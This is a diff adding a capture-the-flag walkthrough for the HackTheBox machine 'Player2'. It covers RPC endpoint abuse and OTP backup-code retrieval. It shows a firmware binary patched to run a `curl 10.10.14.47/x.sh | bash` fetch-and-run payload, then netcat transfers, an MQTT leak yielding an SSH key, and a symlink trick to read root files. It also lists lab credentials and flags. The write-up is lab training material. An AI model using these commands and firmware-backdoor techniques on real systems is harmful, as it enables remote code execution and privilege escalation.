@@ -1,0 +1,38 @@
+On the inital scan we find that we have only two ports open, web ( 80 ) and ssh ( 22 )
+
+On the 80 port we get an interesting error in which is an email adress, `MrR3boot@player2.htb`.
+Adding the `player2.htb` to the /etc/hosts we get the first vhost. Here we have a hint that's interesting, `Our protobs protocol` and another redirection to `http://product.player2.htb`, our second vhost.
+The product we have a login page, which has no vulnerabilities.
+When deeper nmap scan finished, we got another web port, 8545, which runs PHP. Here there is an error message that refers to something called `twirp`. On a brief google search we got that this `is a simple RPC framework built on protobuf.`. And here is our foothold.
+
+After some enum on the 80 port, we get player2.htb/proto. And from further enum we get the endpoint `generated.proto`.
+Let's make a request to the service, using first time POST request and this endpoint `/twirp/twirp.player2.auth.Auth/GenCreds` with this payload `{"creds": 1}`. After a few requests we see a pattern. We got only 4 usernames with 4 scrambled passwords. Now let's try to match them to work!
+Here we should find some OTP, so let's try `/api/totp`. Here we should change the request type to POST, and than to find the parameter which is "action". From the hint we know that we should get the backup codes so the payload should be `{"action": "backup_codes"}`. Now we have the OTP backup code.
+On `/home` we do have a pdf file which contains some interesting information about the stuff that we are supposed to exploit. First we get the archive link `http://product.player2.htb/protobs/protobs_firmware_v1.0.tar` cotaining the "software" that we are supposed to modify and upload.
+Now let's `ghex Protobs.bin` and search through this. On the line containing "[!] Protobs: Service exiting now... stty raw -echo min 0 time 10" we should change it to "curl 10.10.14.47/x.sh | bash;". Archive it `tar -czvf test.tar.gz *` and upload. We got into the www-data. 
+
+Heading to the user. 
+Looking into the enumeration we get an interesting process, Mosquitto. This is to be running being an IOT program.
+!!!IMPROVE: python -c 'import pty; pty.spawn("/bin/bash")' and stty raw -echo
+Upload the mqtt client shell script. ( nc ip port < script.py on Local machine & nc -lvnp port > script.py on Remote ) 
+Give permissions and start using it. Now let's start using this `logging off; connection; connect; subscribe "$SYS/#"` and now we need to wait for the memory leak.
+Now let's set the permissions and try to login, without cracking it. `ssh -i id_rsa observer@10.10.10.170`
+We got the user!
+
+Heading to the root. 
+Let's create a symlink to root.txt using `ln -sf /root/root.txt /home/observer/.ssh/id_rsa`
+and now just use `mosquitto_sub -v -t '$SYS/#'`
+Rooted. 
+
+Credentials:
+-> mprox:tR@dQnwnZEk95*6# ( OTP: 87685768223422 )
+-> 0xdf:XHq7_WJTA?QD_?E2
+
+Flags:
+-> User: CDE09DC7E49C92C78ECAC1535E241251
+-> Root: 73DAEF0B9D5A1328C6B40460E2A7D8C5
+
+Articles:
+-> https://twitchtv.github.io/twirp/docs/intro.html 
+-> https://github.com/bapowell/python-mqtt-client-shell
+-> https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto
